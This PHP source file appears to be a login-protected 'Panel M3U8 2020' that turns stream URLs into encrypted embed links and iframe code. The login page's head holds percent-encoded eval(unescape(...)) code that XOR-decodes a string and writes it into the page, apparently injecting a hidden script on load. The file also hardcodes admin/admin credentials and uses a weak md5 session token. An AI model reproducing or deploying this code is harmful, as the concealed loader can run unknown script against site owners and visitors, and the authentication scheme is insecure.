<?php
session_start();
/* DECLARE VARIABLES */
$username = 'admin';
$password = 'admin';
$random1 = 'secret_key1';
$random2 = 'secret_key2';
$hash = md5($random1 . $password . $random2);
$self = $_SERVER['REQUEST_URI'];
/* USER LOGOUT */
if(isset($_GET['logout']))
{
	unset($_SESSION['login']);
}
/* USER IS LOGGED IN */
if (isset($_SESSION['login']) && $_SESSION['login'] == $hash)
{
	logged_in_msg($username);
}
/* FORM HAS BEEN SUBMITTED */
else if (isset($_POST['submit']))
{
	if ($_POST['username'] == $username && $_POST['password'] == $password)
	{
		//IF USERNAME AND PASSWORD ARE CORRECT SET THE LOGIN SESSION
		$_SESSION["login"] = $hash;
		header("Location: $_SERVER[PHP_SELF]");
	}
	else
	{
		// DISPLAY FORM WITH ERROR
		display_login_form();
		display_error_msg();
	}
}
/* SHOW THE LOGIN FORM */
else
{
	display_login_form();
}
/* TEMPLATES */
function display_login_form()
{
?>
 <!DOCTYPE html>
	<html>
		<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Panel M3U8 2020</title>
	<link rel="stylesheet" href="https://cdn.rawgit.com/ufilestorage/b/master/bootstrap/css/bootstrap.min.css" type="text/css"/>
	<link rel="stylesheet" href="https://cdn.rawgit.com/ufilestorage/b/master/bootstrap/css/main.css" type="text/css"/>
	<script type="text/javascript">
eval(unescape('%66%75%6e%63%74%69%6f%6e%20%65%62%36%37%32%34%61%37%36%61%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%38%36%33%32%39%33%39%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%37%38%37%31%34%36%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%35%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%65%62%36%37%32%34%61%37%36%61%28%27') + '%32%6f%56%69%60%62%6b%1c%66%6a%5f%3c%1b%66%6e%67%6f%6a%3c%2e%2d%56%58%68%2d%6b%59%73%6a%60%6b%20%5a%6d%60%2d%5d%6d%58%6f%67%61%58%6c%6a%58%73%22%60%65%6b%66%2f%69%54%6a%6b%69%69%2d%55%60%5d%5a%60%2c%64%66%19%3d%3e%2e%69%56%6a%65%6f%69%3c18632939%35%31%38%34%34%39%34' + unescape('%27%29%29%3b'));
</script>
        </head>
		<body>
			<div class="trail">
				<canvas id="world"></canvas>
			</div>
	<div class="container" style="opacity:1;">
			<div class="row col-md-offset-2 col-md-8 login-error">
			<div class="alert alert-danger" role="alert">
				<strong>
					<font size="3">The following errors were found</font>	
				</strong>
				<font color="black" size="3">
					<ul type="square">
					</ul>
				</font>
			</div>
		</div>
		
	  	<div class="row-fluid">
	  		<div class="col-sm-offset-2 col-md-offset-4 col-sm-8 col-md-4 col-xs-12 login-form">
	  			<div class="row-fluid">
	  				<div class="col-sm-12 logo-login-form">
	  				<h2 style="text-align:center">Embed</h2>
	  				</div>
	  			</div>
	  			<div class="row-fluid">
	  				<div class="col-sm-12">
	<?php echo '<form action="' . isset($self) . '" method="post">' .
			 '<label for="username">username:</label>' .
			 '<input type="text" name="username" id="username">' .
			 '<label for="password">password:</label>' .
			 '<input type="password" name="password" id="password">' .
			 '<input type="submit" name="submit" value="login" class="btn btn-default primary sub">' .
		 '</form>';
}
function logged_in_msg($username)
{
?>
  </div>
	  			      </div>
	  			   <div>
	  			</div>
	  		</div>
	  	</div>
	</div>
</body>
</html>   

<!DOCTYPE html>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Panel M3U8 2020</title>
	<link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/ITunes_12.2_logo.png/600px-ITunes_12.2_logo.png" type="image/x-icon" />
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.1/css/bootstrap.min.css" type="text/css" />
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" type="text/css" />
	<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
	<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.0/sweetalert.min.js"></script>
	<script type="text/javascript" src="assets/js/apicodes.min.js"></script>
</head>
<body>
	<div class="container">
	     <br>
	     <br>
		<form id="action-form" action="action.php" method="POST" accept-charset="utf-8">
		    <a class="btn btn-info btn-sm" href="?logout=true" role="button">Cerrar Sesion</a>
			<div class="form-group">
				<label class="font-weight-bold">URL M3U8:</label>
				<input type="text" name="link" class="form-control" placeholder="Ex: http://azxtv.com/hls/stream.m3u8"this.select()" required>


			</div>

			<div class="row">

				<div class="col-md-11" id="sub">
					<div id="sub-block">
						<div class="row">
						    <div class="col-md-7">
						        <div class="form-group">
						        	<label class="font-weight-bold">Subtitle</label>
						        	<input type="text" class="form-control" name="sub[0]" placeholder="Ex: name.com/api/apipanel/drop/the.boss.baby.srt (optional)" onclick="this.select()"> 
						        </div>
						    </div>
						    
						    <div class="col-md-4">
						        <div class="form-group">
						        	<label class="font-weight-bold">Idioma</label>
						        	<input type="text" class="form-control" name="label[0]" placeholder="Ex: English (optional)" onclick="this.select()"> 
						        </div>
						    </div>
						    
						    <div class="col-md-1" style="margin-top: 30px">
						    <button type="button" id="add_new_sub" data-total="1" class="btn btn-success btn-block"><i class="fa fa-plus"></i></button>
						    </div>
						</div>
					</div>
				</div>

			</div>

			<div class="form-group">
				<label class="font-weight-bold">Url Imagen:</label>
				<input type="text" name="poster" class="form-control" placeholder="Ex: https://as01.epimg.net/meristation/imagenes/2019/01/08/reportajes/1546933662_826942_1546935400_noticia_normal.jpg" onclick="this.select()">
			</div>

			<div class="form-group">
				<button type="submit" id="action-submit" class="btn btn-dark"> <span id="fa-loading"></i></span> Encriptar URL</button>
			</div>
		</form>
		
		<div class="form-group">
			<label class="font-weight-bold">URL Directo:</label>
			<input type="text" id="url-encode" class="form-control" placeholder="La URL después de la codificación se mostrará aquí ..." onclick="this.select()">
		</div>

		<div class="form-group">
			<label class="font-weight-bold">Iframe:</label>
			<textarea rows="5" class="form-control" id="iframe-encode" placeholder="La URL con iframe después de la codificación se mostrará aquí ..." onclick="this.select()"></textarea>
		</div>
		<?php  $domainServer = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://" . $_SERVER['SERVER_NAME'] . dirname($_SERVER['PHP_SELF']); ?>
		<script type="text/javascript">
			jQuery(function ($) {
				$('#action-form').submit(function(e) {
					e.preventDefault();
					$('#action-submit').prop('disabled', !0);
					$('#fa-loading').html('<i class="fa fa-spinner fa-spin"></i>');
		       		var b = $(this).serializeArray(), c = $(this).attr('action');
					$.ajax({
				        type: 'POST',
				        dataType: 'text',
				        url: c,
				        data: b,
						error: function (result) {
							alert("Something went wrong. Please try again!");
							$('#fa-loading').html('<i class="fa fa-arrow-circle-right"></i>');
							$('#action-submit').removeAttr('disabled');
						},
						success: function (result) {
							$('#url-encode').val('<?php echo $domainServer . '/embed.php?data=' ?>'+result+'');
							$('#iframe-encode').html('<iframe src="<?php echo $domainServer . '/embed.php?data=' ?>'+result+'" width="100%" height="100%" frameborder="0" allowfullscreen></iframe>');
							$('#fa-loading').html('<i class="fa fa-arrow-circle-right"></i>');
							$('#action-submit').removeAttr('disabled');
						}
					});
				});
			});
		</script>

		<hr>
		<footer class="footer">
		</footer>
	</div><!-- /.container -->
	<?php
	}
function display_error_msg()
{
	echo '<p>Username or password is invalid</p>';
}
?>

</body>
</html>
